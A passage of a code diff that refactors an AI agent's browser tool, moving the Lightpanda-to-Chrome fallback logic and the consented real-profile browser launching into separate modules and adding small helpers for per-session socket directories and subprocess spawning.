-    """Whether ``browser.engine: lightpanda`` is actually in effect, and why.
-
-    Returns ``(False, "")`` when the engine is not lightpanda. Otherwise the
-    reason names the setting that shadows it (a cloud provider, Camofox, a
-    CDP override, Browser Use cloud, the real-profile toggle) or, when it is
-    in use, which driver runs it. Mirrors the precedence of
-    ``_should_inject_engine`` (built-in tools) and
-    ``browser_use_cli._resolve_backend_cdp`` (Browser Use mode) using gates
-    that do no network I/O (config reads only), so ``/browser status`` and
-    ``hermes doctor`` can call it.
-    """
-    if not _using_lightpanda_engine():
-        return False, ""
-    if _get_cdp_override_raw():
-        return False, "a CDP override is active (/browser connect or browser.cdp_url)"
-    if _is_camofox_mode():
-        return False, "Camofox is the selected browser (CAMOFOX_URL)"
-    # Real-profile is checked before the cloud provider: in browser_exec the
-    # real-profile resolution runs before backend resolution, so with both
-    # set it is the real-profile toggle that actually claims the session.
-    if _use_real_profile():
-        return False, "browser.use_real_profile is on (Lightpanda cannot load a Chromium profile)"
-    try:
-        provider = _get_cloud_provider()
-    except Exception:
-        provider = None
-    if provider is not None:
-        try:
-            name = provider.provider_name()
-        except Exception:
-            name = type(provider).__name__
-        return False, (
-            f"cloud provider {name} is selected (browser.cloud_provider, or "
-            "auto-detected from credentials)"
-        )
-    bu_mode = _is_browser_use_cli_mode()
-    if bu_mode:
-        try:
-            from tools.browser_use_cli import (
-                _read_browser_cfg,
-                is_legacy_browser_use_cloud_config,
-            )
-
-            if is_legacy_browser_use_cloud_config(_read_browser_cfg()):
-                return False, "Browser Use cloud (BROWSER_USE_API_KEY) is selected"
-        except Exception as e:
-            logger.debug("legacy Browser Use cloud check failed: %s", e)
-    if bu_mode:
-        return True, "Browser Use mode: Hermes spawns `lightpanda serve` per session"
-    return True, "built-in browser tools: agent-browser --engine lightpanda"
-
-
-def _lightpanda_fallback_reason(engine: str, command: str, result: Dict[str, Any]) -> Optional[str]:
-    """Return the user-visible reason a Lightpanda result needs Chrome fallback.
-
-    ``None`` means no fallback should run.  The returned string is copied into
-    the fallback result so CLI/TUI/gateway users can see when Hermes silently
-    switched from Lightpanda to Chrome for completeness.
-    """
-    if engine != "lightpanda":
-        return None
-
-    # Only retry commands where Chrome can meaningfully produce a different
-    # result. Session-management commands (close, record) are tied to the
-    # engine's daemon and can't be retried on a different engine.
-    _FALLBACK_ELIGIBLE = {"open", "snapshot", "screenshot", "eval", "click",
-                          "fill", "scroll", "back", "press", "console", "errors"}
-    if command not in _FALLBACK_ELIGIBLE:
-        return None
-
-    # Explicit failure
-    if not result.get("success"):
-        error = str(result.get("error") or "command failed").strip()
-        return f"Lightpanda {command!r} failed ({error}); retried with Chrome."
-
-    data = result.get("data", {})
-
-    if command == "snapshot":
-        snap = data.get("snapshot", "")
-        # Empty or near-empty snapshots indicate Lightpanda couldn't render
-        if not snap or len(snap.strip()) < 20:
-            return "Lightpanda returned an empty/too-short snapshot; retried with Chrome."
-
-    if command == "screenshot":
-        # Lightpanda returns a placeholder PNG with its panda logo.
-        # Since LP PR #1766 resized it to 1920x1080, the placeholder is
-        # ~17 KB.  Real Chromium screenshots are typically 100 KB+.
-        path = data.get("path", "")
-        if path:
-            try:
-                size = os.path.getsize(path)
-                if size < 20480:
-                    logger.debug("Lightpanda screenshot is suspiciously small (%d bytes), "
-                                 "triggering Chrome fallback", size)
-                    return (
-                        f"Lightpanda screenshot was suspiciously small ({size} bytes); "
-                        "retried with Chrome."
-                    )
-            except OSError:
-                return "Lightpanda screenshot file was missing/unreadable; retried with Chrome."
-
-    return None
-
-
-def _needs_lightpanda_fallback(engine: str, command: str, result: Dict[str, Any]) -> bool:
-    """Check if a Lightpanda result should trigger an automatic Chrome fallback."""
-    return _lightpanda_fallback_reason(engine, command, result) is not None
-
-
-def _annotate_lightpanda_fallback(result: Dict[str, Any], reason: str) -> Dict[str, Any]:
-    """Add a user-visible Chrome fallback warning to a browser command result."""
-    warning = (
-        "⚠ Lightpanda fallback: Chrome was used for this browser action. "
-        f"{reason}"
-    )
-    annotated = dict(result)
-    annotated["fallback_warning"] = warning
-    annotated["browser_engine"] = "chrome"
-    annotated["browser_engine_fallback"] = {
-        "from": "lightpanda",
-        "to": "chrome",
-        "reason": reason,
-    }
-    data = annotated.get("data")
-    if isinstance(data, dict):
-        data = dict(data)
-        data.setdefault("fallback_warning", warning)
-        data.setdefault("browser_engine", "chrome")
-        data.setdefault(
-            "browser_engine_fallback",
-            {"from": "lightpanda", "to": "chrome", "reason": reason},
-        )
-        annotated["data"] = data
-    return annotated
-
-
-def _copy_fallback_warning(target: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
-    """Copy browser fallback metadata from an internal result into a tool response."""
-    if result.get("fallback_warning"):
-        target["fallback_warning"] = result["fallback_warning"]
-        target["browser_engine"] = result.get("browser_engine")
-        target["browser_engine_fallback"] = result.get("browser_engine_fallback")
-    return target
-
-
-def _run_chrome_fallback_command(
-    task_id: str,
-    command: str,
-    args: List[str],
-    timeout: int,
-) -> Dict[str, Any]:
-    """Run a browser command in a temporary Chrome session at the current URL.
-
-    agent-browser locks the engine when a named daemon starts. Passing
-    ``--engine chrome`` to the same Lightpanda ``--session`` cannot change that
-    running daemon. This helper always uses a fresh temporary Chrome session,
-    navigates it to the current Lightpanda URL, runs ``command``, then tears it
-    down.
-    """
-    import uuid
-
-    # 1. Grab the current URL from the Lightpanda session. ``get url`` is not
-    # fallback-eligible, so an error cannot recursively trigger this helper.
-    # Keep the explicit Lightpanda override so Chromium-only environment flags
-    # are stripped while querying the already-running Lightpanda daemon.
-    url_result = _run_browser_command(
-        task_id, "get", ["url"], timeout=10, _engine_override="lightpanda"
-    )
-    current_url = None
-    if url_result.get("success"):
-        current_url = str(url_result.get("data", {}).get("url", "")).strip()
-    if not current_url:
-        logger.warning("Chrome fallback: could not determine current URL from LP session")
-        return {"success": False, "error": "Chrome fallback failed: could not determine current URL"}
-
-    # 2. Create a temporary Chrome session (bypasses _get_session_info's cache).
-    tmp_session = f"h_cfb_{uuid.uuid4().hex[:8]}"
-    try:
-        browser_cmd = _find_agent_browser()
-    except FileNotFoundError as e:
-        return {"success": False, "error": str(e)}
-
-    if not _chromium_installed():
-        if _running_in_docker():
-            hint = (
-                "Chrome fallback requires Chromium, but it is missing. "
-                "You're running in Docker — pull the latest image: "
-                "docker pull ghcr.io/nousresearch/hermes-agent:latest"
-            )
-        else:
-            hint = (
-                "Chrome fallback requires Chromium, but it is missing. Install it with: "
-                "npx agent-browser install --with-deps "
-                "(or: npx playwright install --with-deps chromium)"
-            )
-        return {"success": False, "error": hint}
-
-    # Resolve npx via the same PATH + extended-PATH cascade _find_agent_browser
-    # uses, not a bare shutil.which("npx") — Hermes-managed-Node-only setups
-    # resolve npx only through the extended fallback path, and a bare lookup
-    # would let a broken system npx shadow a healthy managed one. If npx isn't
-    # found at all (Termux, bare container), fall back to the bare name and
-    # let Popen raise with a readable "FileNotFoundError: 'npx'" rather than
-    # WinError 193.
-    if _is_npx_agent_browser_sentinel(browser_cmd):
-        _npx_bin = _resolve_npx_bin() or "npx"
-        # --ignore-scripts: AGENT_BROWSER_NPX_SPEC is a floating ^0.26.0 range,
-        # not an exact pin — a compromised future 0.26.x patch must not get to
-        # run its own install-time lifecycle scripts on this machine.
-        cmd_prefix = [_npx_bin, "--ignore-scripts", "--prefer-offline", "-y", AGENT_BROWSER_NPX_SPEC]
-    else:
-        cmd_prefix = [browser_cmd]
-    base_args = cmd_prefix + ["--engine", "chrome", "--session", tmp_session, "--json"]
-
-    task_socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{tmp_session}")
-    os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
-    # Claim the dir before using it: another hermes process's orphan reaper
-    # rmtree's any agent-browser-* dir in the shared tmpdir that carries no
-    # live owner, which otherwise deletes this one mid-command.
-    _write_owner_pid(task_socket_dir, tmp_session)
-    browser_env = _build_browser_env()
-    browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir
-    browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))
-
-    if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
-        browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
-
-    # This helper bypasses _run_browser_command, so apply the same Chromium
-    # sandbox policy explicitly.
-    _apply_chromium_sandbox_args(browser_env)
-
-    def _run_tmp(cmd: str, cmd_args: List[str]) -> Dict[str, Any]:
-        full = base_args + [cmd] + cmd_args
-        # Use temp-file stdout/stderr pattern (same as _run_browser_command)
-        # to avoid pipe hang from agent-browser daemon inheriting fds.
-        stdout_path = os.path.join(task_socket_dir, f"_stdout_{cmd}")
-        stderr_path = os.path.join(task_socket_dir, f"_stderr_{cmd}")
-        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
-        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
-        try:
-            # On Windows, launch the child in a new process group so parent
-            # console Ctrl+C doesn't kill it with STATUS_CONTROL_C_EXIT
-            # (0xC000013A = rc 3221225786), AND insulate its stdio + handle
-            # inheritance from the parent.
-            #
-            # Additional Windows hardening beyond CREATE_NEW_PROCESS_GROUP:
-            # * STARTF_USESTDHANDLES + explicit handles → CreateProcess hands
-            #   the child ONLY our three chosen handles (DEVNULL stdin +
-            #   temp-file stdout/stderr). Without this, some parents leak
-            #   console handles that break downstream grandchild spawns — the
-            #   agent-browser Rust binary spawns a detached daemon grandchild,
-            #   and that grandchild's CreateProcess dies silently
-            #   ("Daemon process exited during startup with no error output")
-            #   when inherited parent handles are in a weird state. Observed
-            #   in the Hermes CLI where sys.stdout and sys.stderr both report
-            #   fileno=1 (stderr dup'd onto stdout at the OS level).
-            # * close_fds=True → block inheritance of every other handle.
-            #   (Default on POSIX; must be explicit on Windows for stdio.)
-            _popen_extra: dict = {}
-            if os.name == "nt":
-                # CREATE_NO_WINDOW → don't attach a console (cmd.exe would
-                # otherwise briefly allocate one for the .cmd shim).
-                # Do NOT add CREATE_NEW_PROCESS_GROUP: on Python 3.11 Windows
-                # it interacts with asyncio's ProactorEventLoop such that the
-                # subprocess creation cancels the running loop task, which
-                # surfaces as KeyboardInterrupt in app.run() and tears down
-                # the CLI mid-turn. The agent thread's subprocess spawn
-                # unwound MainThread's prompt_toolkit loop that way — see
-                # diag log: "asyncio.CancelledError → KeyboardInterrupt".
-                _popen_extra["creationflags"] = windows_hide_flags()
-                _popen_extra["close_fds"] = True
-                _si = subprocess.STARTUPINFO()
-                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
-                _popen_extra["startupinfo"] = _si
-            proc = subprocess.Popen(
-                full, stdout=stdout_fd, stderr=stderr_fd,
-                stdin=subprocess.DEVNULL, env=browser_env,
-                **_popen_extra,
-            )
-        finally:
-            os.close(stdout_fd)
-            os.close(stderr_fd)
-        try:
-            proc.wait(timeout=timeout)
-        except subprocess.TimeoutExpired:
-            proc.kill()
-            proc.wait()
-            return {"success": False, "error": f"Chrome fallback '{cmd}' timed out"}
-        try:
-            with open(stdout_path, "r", encoding="utf-8") as f:
-                stdout = f.read().strip()
-            if stdout:
-                return json.loads(stdout.split("\n")[-1])
-        except Exception as exc:
-            logger.debug("Chrome fallback tmp cmd '%s' error: %s", cmd, exc)
-        finally:
-            for pth in (stdout_path, stderr_path):
-                try:
-                    os.unlink(pth)
-                except OSError:
-                    pass
-        return {"success": False, "error": f"Chrome fallback '{cmd}' failed"}
-
-    try:
-        # 3. Navigate Chrome to the same URL.
-        nav = _run_tmp("open", [current_url])
-        if not nav.get("success"):
-            logger.warning("Chrome fallback: navigate failed: %s", nav.get("error"))
-            return {"success": False, "error": f"Chrome fallback navigate failed: {nav.get('error')}"}
-
-        # 4. Run the requested command in Chrome.
-        return _run_tmp(command, args)
-
-    finally:
-        # 5. Tear down the temporary Chrome session.
-        try:
-            _run_tmp("close", [])
-        except Exception:
-            pass
-        # Clean up socket directory
-        import shutil as _shutil
-        _shutil.rmtree(task_socket_dir, ignore_errors=True)
-
-
-def _chrome_fallback_screenshot(
-    task_id: str,
-    args: List[str],
-    timeout: int,
-) -> Dict[str, Any]:
-    """Take a screenshot using a temporary Chrome session."""
-    return _run_chrome_fallback_command(task_id, "screenshot", args, timeout)
+from tools.browser_tool_lightpanda_fallback import (  # noqa: F401
+    _using_lightpanda_engine,
+    lightpanda_engine_status,
+    _lightpanda_fallback_reason,
+    _needs_lightpanda_fallback,
+    _annotate_lightpanda_fallback,
+    _copy_fallback_warning,
+    _run_chrome_fallback_command,
+    _chrome_fallback_screenshot,
+)
 
 
 def _auto_local_for_private_urls() -> bool:
-    """Return whether a cloud-configured install should auto-spawn a local
-    Chromium for LAN/localhost URLs.
+    """``browser.auto_local_for_private_urls`` (default True), cached for the process.
 
-    Reads ``browser.auto_local_for_private_urls`` once (default ``True``) and
-    caches it for the process lifetime.  When enabled, ``browser_navigate``
-    routes URLs whose host resolves to a private/loopback/LAN address to a
-    local headless Chromium sidecar even when a cloud provider (Browserbase
-    / Browser-Use / Firecrawl) is configured globally.  Public URLs continue
-    to use the cloud provider in the same conversation.
+    When on, ``browser_navigate`` routes private/loopback/LAN URLs to a local
+    Chromium sidecar even with a cloud provider configured; public URLs keep
+    using the cloud provider in the same conversation.
     """
     global _auto_local_for_private_urls_resolved, _cached_auto_local_for_private_urls
     if _auto_local_for_private_urls_resolved:
         return _cached_auto_local_for_private_urls
 
     _auto_local_for_private_urls_resolved = True
-    try:
-        from hermes_cli.config import read_raw_config
-        cfg = read_raw_config()
-        browser_cfg = cfg.get("browser", {})
-        if isinstance(browser_cfg, dict) and "auto_local_for_private_urls" in browser_cfg:
-            _cached_auto_local_for_private_urls = bool(
-                browser_cfg.get("auto_local_for_private_urls")
-            )
-    except Exception as e:
-        logger.debug("Could not read auto_local_for_private_urls from config: %s", e)
+    _cached_auto_local_for_private_urls = _browser_cfg(
+        "auto_local_for_private_urls", _cached_auto_local_for_private_urls, bool,
+        "auto_local_for_private_urls from config",
+    )
     return _cached_auto_local_for_private_urls
 
 
@@ -1519,15 +1027,7 @@ def _use_real_profile() -> bool:
     The read is one YAML load per local session creation (not per command),
     so there is no hot-path cost to keeping it uncached.
     """
-    try:
-        from hermes_cli.config import read_raw_config
-        cfg = read_raw_config()
-        browser_cfg = cfg.get("browser", {})
-        if isinstance(browser_cfg, dict):
-            return bool(browser_cfg.get("use_real_profile", False))
-    except Exception as e:
-        logger.debug("Could not read use_real_profile from config: %s", e)
-    return False
+    return _browser_cfg("use_real_profile", False, bool, "use_real_profile from config")
 
 
 # Session name for the single shared real-profile copy-browser. All consented
@@ -1540,385 +1040,101 @@ _real_profile_cdp_cache: dict = {}
 _real_profile_chrome_procs: list = []  # Popen handles of directly-launched real browsers
 
 
-def _terminate_real_profile_chrome() -> None:
-    """Terminate real-browser processes launched for real-profile sessions.
-
-    The real-profile path launches the user's actual browser binary on the
-    profile COPY (bypassing agent-browser's mock-keychain launch). Those
-    processes are ours to reap: agent-browser only ATTACHED to them, so its
-    own session cleanup never kills them. Idempotent; safe from atexit.
-    """
-    while _real_profile_chrome_procs:
-        proc = _real_profile_chrome_procs.pop()
-        try:
-            if proc.poll() is None:
-                proc.terminate()
-                try:
-                    proc.wait(timeout=5)
-                except Exception:
-                    proc.kill()
-        except Exception as e:
-            logger.debug("real-profile chrome terminate failed: %s", e)
+from tools.browser_tool_real_profile import (  # noqa: F401
+    _terminate_real_profile_chrome,
+    _cdp_http_ready,
+    _agent_browser_get_cdp,
+    _cdp_on_data_dir,
+    _agent_browser_close_session,
+    _REAL_PROFILE_CHROME_FLAGS,
+    _real_profile_unsupported_reason,
+    _real_profile_snapshot_error,
+    _launch_real_profile_chrome,
+    _attach_agent_browser_to_real_profile,
+    _real_profile_cdp,
+)
 
 
 def _agent_browser_argv(browser_cmd: str) -> list:
-    """Command prefix to invoke agent-browser (binary or npx sentinel)."""
+    """Command prefix to invoke agent-browser (concrete binary or npx sentinel).
+
+    Concrete executable paths stay a single argv item (spaces intact); only the
+    synthetic npx sentinel expands. npx is resolved through the same
+    PATH + extended-PATH cascade ``_find_agent_browser`` uses — a bare
+    ``shutil.which("npx")`` would let a broken system npx shadow a healthy
+    Hermes-managed one. If npx isn't found at all (Termux, bare container) the
+    bare name is used so Popen raises a readable ``FileNotFoundError: 'npx'``.
+    ``--ignore-scripts``: AGENT_BROWSER_NPX_SPEC is a floating range, not an
+    exact pin — a compromised future patch must not run install-time scripts.
+    """
     if _is_npx_agent_browser_sentinel(browser_cmd):
         _npx_bin = _resolve_npx_bin() or "npx"
         return [_npx_bin, "--ignore-scripts", "--prefer-offline", "-y", AGENT_BROWSER_NPX_SPEC]
     return [browser_cmd]
 
 
-def _cdp_http_ready(http_cdp: str) -> bool:
-    """True when an ``http://host:port`` CDP discovery root answers."""
-    try:
-        from hermes_cli.browser_connect import is_browser_debug_ready
+def _prepare_session_socket_dir(session_name: str) -> str:
+    """Create the per-session agent-browser socket dir and claim it with our PID.
 
-        return is_browser_debug_ready(http_cdp, timeout=1.0)
-    except Exception:
-        return False
-
-
-def _agent_browser_get_cdp(session_name: str) -> Optional[str]:
-    """Return the HTTP CDP endpoint of an agent-browser session, or None.
-
-    agent-browser prints ``ws://127.0.0.1:<port>/devtools/browser/<id>`` for
-    ``get cdp-url``; the browser-use harness wants the HTTP discovery root
-    (``http://127.0.0.1:<port>``), so we convert. None when the session isn't
-    running or the port can't be parsed.
+    Each session gets its own dir so parallel workers don't fight over the
+    default socket path ("Failed to create socket directory: Permission
+    denied"). The owner_pid file is written BEFORE first use: another hermes
+    process's orphan reaper rmtree's any agent-browser-* dir in the shared
+    tmpdir that carries no live owner, which would delete this one mid-command.
     """
-    try:
-        browser_cmd = _find_agent_browser()
-    except FileNotFoundError:
-        return None
-    try:
-        proc = subprocess.run(
-            [*_agent_browser_argv(browser_cmd), "--session", session_name, "get", "cdp-url"],
-            capture_output=True, text=True, timeout=15, env=_build_browser_env(),
-        )
-    except (subprocess.SubprocessError, OSError) as e:
-        logger.debug("real-profile get cdp-url failed: %s", e)
-        return None
-    out = (proc.stdout or "").strip()
-    m = re.search(r"ws://127\.0\.0\.1:(\d+)/", out)
-    if not m:
-        return None
-    return f"http://127.0.0.1:{m.group(1)}"
+    socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
+    os.makedirs(socket_dir, mode=0o700, exist_ok=True)
+    _write_owner_pid(socket_dir, session_name)
+    return socket_dir
 
 
-def _cdp_on_data_dir(http_cdp: str, data_dir: str) -> bool:
-    """True when the CDP endpoint's browser is running on ``data_dir``.
+def _agent_browser_command_env(socket_dir: str) -> Dict[str, str]:
+    """Credential-scrubbed env for one agent-browser command.
 
-    agent-browser's launched Chrome writes ``DevToolsActivePort`` into its
-    user-data-dir with the live debug port on the first line. Matching that
-    port against the CDP endpoint's port confirms the running browser is our
-    profile copy — not a throwaway temp dir a raced/stale launch fell back to.
+    Adds the discovery-time PATH fallbacks, the session socket dir, and the
+    daemon-side idle self-termination (``AGENT_BROWSER_IDLE_TIMEOUT_MS``,
+    agent-browser 0.24+) mirroring the Python-side inactivity janitor —
+    unless the user set the idle timeout explicitly.
     """
-    m = re.search(r":(\d+)", http_cdp or "")
-    if not m:
-        return False
-    try:
-        with open(os.path.join(data_dir, "DevToolsActivePort"), encoding="utf-8") as fh:
-            port_line = fh.readline().strip()
-        return port_line == m.group(1)
-    except OSError:
-        return False
+    env = _build_browser_env()
+    env["PATH"] = _merge_browser_path(env.get("PATH", ""))
+    env["AGENT_BROWSER_SOCKET_DIR"] = socket_dir
+    if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in env:
+        env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
+    return env
 
 
-def _agent_browser_close_session(session_name: str) -> None:
-    """Best-effort close of an agent-browser session (stale/wrong-dir cleanup)."""
-    try:
-        browser_cmd = _find_agent_browser()
-    except FileNotFoundError:
-        return
-    try:
-        subprocess.run(
-            [*_agent_browser_argv(browser_cmd), "--session", session_name, "close"],
-            capture_output=True, text=True, timeout=15, env=_build_browser_env(),
-        )
-    except (subprocess.SubprocessError, OSError) as e:
-        logger.debug("real-profile session close failed: %s", e)
+def _popen_agent_browser(argv: List[str], env: Dict[str, str], socket_dir: str, tag: str) -> "subprocess.Popen":
+    """Spawn agent-browser with stdout/stderr redirected to ``socket_dir/_stdout_<tag>``.
 
-
-def _real_profile_cdp() -> tuple:
-    """Resolve ``(cdp_url, error)`` for consented real-profile browsing.
-
-    Snapshots the user's default-Chromium profile into a hermes-owned copy
-    (auth/login state only), then has agent-browser launch its packaged
-    Chromium on that copy and returns the HTTP CDP endpoint for the browser-use
-    harness to attach to. The copy is a non-default dir, so it sidesteps the
-    Chrome ≥136 default-profile remote-debugging block and never contends with
-    the user's running browser; agent-browser launches the packaged Chromium
-    with no mock-keychain switches, so keyring-encrypted cookies decrypt.
-
-    A single shared agent-browser session is reused across calls (its CDP URL
-    is cached and re-validated). Returns ``(None, message)`` fail-closed when
-    the default browser is non-Chromium or the snapshot/launch fails;
-    ``(None, None)`` when consent is off.
+    Temp files instead of pipes: the CLI forks a background daemon that inherits
+    its fds, so with pipes ``communicate()`` never sees EOF until the timeout.
+    Windows: CREATE_NO_WINDOW only (NOT CREATE_NEW_PROCESS_GROUP, which on
+    Python 3.11 cancels asyncio's running loop task and surfaces as
+    KeyboardInterrupt in the CLI), STARTF_USESTDHANDLES so CreateProcess hands
+    the child ONLY our three handles (leaked parent console handles make the
+    Rust binary's daemon grandchild die silently), close_fds=True for the rest.
+    Returns the Popen; the caller reads/unlinks the two files.
     """
-    if not _use_real_profile():
-        # Consent is off. If a snapshot store from a previous consented run is
-        # still on disk, it holds copies of the user's cookies/logins — delete
-        # it so revoking consent actually removes the credential copies. Cheap
-        # (one isdir check) and idempotent.
-        try:
-            from hermes_cli.browser_connect import cleanup_real_profile_snapshots
-
-            cleanup_real_profile_snapshots()
-        except Exception as e:
-            logger.debug("real-profile cleanup-on-consent-off failed: %s", e)
-        _real_profile_cdp_cache.pop("cdp", None)
-        return None, None
-
-    # Lightpanda cannot load a Chromium profile — agent-browser rejects
-    # ``--profile`` outright under that engine ("Profiles are not supported
-    # with Lightpanda"). Detect it here, BEFORE default-browser detection, so
-    # even a host with no Chromium default reports the actionable conflict (the
-    # engine setting) rather than a generic launch failure.
-    if _using_lightpanda_engine():
-        return None, (
-            "browser.use_real_profile is on, but browser.engine is set to "
-            "'lightpanda', which cannot load a real Chromium profile. Set "
-            "browser.engine to 'auto' or 'chrome' to use real-profile browsing, "
-            "or turn the toggle off."
+    stdout_path = os.path.join(socket_dir, f"_stdout_{tag}")
+    stderr_path = os.path.join(socket_dir, f"_stderr_{tag}")
+    stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+    stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+    try:
+        _popen_extra: dict = {}
+        if os.name == "nt":
+            _popen_extra["creationflags"] = windows_hide_flags()
+            _popen_extra["close_fds"] = True
+            _si = subprocess.STARTUPINFO()
+            _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
+            _popen_extra["startupinfo"] = _si
+        return subprocess.Popen(
+            argv, stdout=stdout_fd, stderr=stderr_fd,
+            stdin=subprocess.DEVNULL, env=env, **_popen_extra,
         )
-
-    from hermes_cli.browser_connect import (
-        UNSUPPORTED_CHANNEL,
-        detect_default_chromium,
-        real_profile_copy_dir,
-        snapshot_real_profile,
-    )
-
-    with _real_profile_cdp_lock:
-        # Reuse a live copy-browser from an earlier call this process made.
-        cached = _real_profile_cdp_cache.get("cdp")
-        if cached and _cdp_http_ready(cached):
-            return cached, None
-        _real_profile_cdp_cache.pop("cdp", None)
-
-        browser = detect_default_chromium()
-        if browser is None:
-            return None, (
-                "browser.use_real_profile is on, but your default browser is not a "
-                "supported Chromium browser (Chrome, Edge, Brave, Brave Origin, "
-                "Chromium). "
-                "Real-profile browsing requires a Chromium default; set one or turn "
-                "the toggle off."
-            )
-        if browser == UNSUPPORTED_CHANNEL:
-            # A recognized pre-release channel (Beta/Dev/Canary) is the OS
-            # default. Its profile lives in a channel-specific directory we
-            # don't resolve, and normalizing it to the stable family would
-            # drive a DIFFERENT profile/account — a wrong-principal bug. Fail
-            # closed rather than guess (#95549 invariant).
-            return None, (
-                "browser.use_real_profile is on, but your default browser is a "
-                "pre-release Chromium channel (Beta / Dev / Canary), which "
-                "real-profile browsing does not support. Set your default to a "
-                "stable Chrome / Edge / Brave / Brave Origin / Chromium, or turn "
-                "the toggle off."
-            )
-
-        # Reuse BEFORE writing anything. A shared copy-browser may already be up
-        # from a previous hermes process; if it is driving OUR copy dir, hand it
-        # back untouched. CRITICAL: the snapshot overlay (which truncates and
-        # rewrites Cookies / Login Data) must NOT run while that browser holds
-        # the user-data-dir open — doing so corrupts the live databases (torn
-        # reads, locked transactions, phantom logouts). So resolve the copy dir
-        # as a PATH only (no copy), probe reuse, and return early on a hit. The
-        # snapshot/overlay happens solely on the relaunch path below, when no
-        # live browser owns the dir.
-        copy_dir = real_profile_copy_dir(browser)
-        existing = _agent_browser_get_cdp(_REAL_PROFILE_SESSION)
-        if existing and _cdp_http_ready(existing) and _cdp_on_data_dir(existing, copy_dir):
-            _real_profile_cdp_cache["cdp"] = existing
-            return existing, None
-        if existing:
-            # Stale/wrong-dir session (throwaway-temp fallback, or an old copy):
-            # close it so nothing holds the dir open before we overlay + relaunch.
-            _agent_browser_close_session(_REAL_PROFILE_SESSION)
-
-        # No live browser owns the dir now — safe to (re)snapshot + overlay.
-        snap_dir, err = snapshot_real_profile(browser)
-        if err or not snap_dir:
-            from hermes_cli.browser_connect import _PROFILE_LOCKED_PREFIX
-
-            if err and err.startswith(_PROFILE_LOCKED_PREFIX):
-                # The user's browser is holding the profile. Surface the guidance
-                # verbatim (it already tells the agent whether closing is armed)
-                # plus the exact approved-close command. The agent must ASK the
-                # user before running it — it quits their browser.
-                body = err[len(_PROFILE_LOCKED_PREFIX):]
-                return None, (
-                    body + " To close it (only after the user approves — it "
-                    "quits their browser and loses unsaved tabs), run: "
-                    "`hermes browser close-profile`, then retry."
-                )
-            return None, f"browser.use_real_profile is on, but {err}"
-        copy_dir = snap_dir
-
-        # Launch the user's REAL browser binary directly on the profile COPY.
-        # agent-browser 0.35's own
-        # launch path force-adds --use-mock-keychain/--password-store=basic
-        # (and --headless=new), which makes macOS Chrome treat every
-        # keychain-encrypted cookie as undecryptable and drop it — the copied
-        # profile launches signed out. Launching the real binary ourselves with
-        # NO mock-keychain switches keeps the OS keychain path intact, exactly
-        # as the snapshot design intends; agent-browser attaches to it after
-        # via --auto-connect (--cdp <port>).
-        from hermes_cli.browser_connect import chromium_executable
-
-        real_binary = chromium_executable(browser)
-        if real_binary is None:
-            return None, (
-                "browser.use_real_profile is on, but the real browser binary for "
-                f"'{browser}' could not be found. Reinstall it or turn the toggle off."
-            )
-
-        port_file = os.path.join(copy_dir, "DevToolsActivePort")
-        try:
-            os.unlink(port_file)  # stale port from a previous launch confuses reuse probes
-        except OSError:
-            pass
-        chrome_argv = [
-            real_binary,
-            f"--user-data-dir={copy_dir}",
-            "--remote-debugging-port=0",
-            "--no-first-run",
-            "--no-default-browser-check",
-            "--disable-background-networking",
-            "--disable-component-update",
-            "--disable-default-apps",
-            "--disable-hang-monitor",
-            "--disable-popup-blocking",
-            "--disable-prompt-on-repost",
-            "--disable-sync",
-            "--disable-features=Translate",
-            "--no-startup-window",
-        ]
-        # Drive the copy headlessly by default. Real-profile browsing is a
-        # background capability — the agent tweets / fills forms / scrapes on
-        # the user's behalf while they keep working; a visible window that
-        # steals focus every turn defeats the point. Chrome's NEW headless mode
-        # shares the profile's normal cookie store (unlike legacy --headless
-        # with its separate store), so the copied auth/login state still loads.
-        # Cookie decryption is unaffected by headless: the drop we guard against
-        # comes from --use-mock-keychain (which agent-browser's own launcher
-        # force-adds and we deliberately avoid), NOT from headless mode. This
-        # also covers display-less Linux (servers, CI), where a headed launch
-        # would exit at startup. Users who want to watch can opt in via the same
-        # browser.headed / AGENT_BROWSER_HEADED toggle the rest of the browser
-        # stack honors; on a display-less host we force headless regardless so
-        # the launch doesn't die.
-        _has_display = bool(
-            os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")
-        )
-        _want_headed = _is_headed_mode() and (
-            _has_display or not sys.platform.startswith("linux")
-        )
-        if not _want_headed:
-            chrome_argv.append("--headless=new")
-        try:
-            chrome_proc = subprocess.Popen(
-                chrome_argv,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                stdin=subprocess.DEVNULL,
-                start_new_session=True,
-                env=_build_browser_env(),
-            )
-        except (subprocess.SubprocessError, OSError) as e:
-            return None, f"browser.use_real_profile is on, but the launch failed: {e}"
-        _real_profile_chrome_procs.append(chrome_proc)
-
-        # Wait for DevToolsActivePort to appear (Chrome picks a free port).
-        import time as _time
-
-        deadline = _time.monotonic() + 30.0
-        port = None
-        while _time.monotonic() < deadline:
-            try:
-                with open(port_file, encoding="utf-8") as fh:
-                    line = fh.readline().strip()
-                if line.isdigit():
-                    port = int(line)
-                    break
-            except OSError:
-                pass
-            if chrome_proc.poll() is not None:
-                _terminate_real_profile_chrome()
-                return None, (
-                    "browser.use_real_profile is on, but Chrome exited during "
-                    "startup (another instance may hold the profile copy)."
-                )
-            _time.sleep(0.25)
-        if port is None:
-            _terminate_real_profile_chrome()
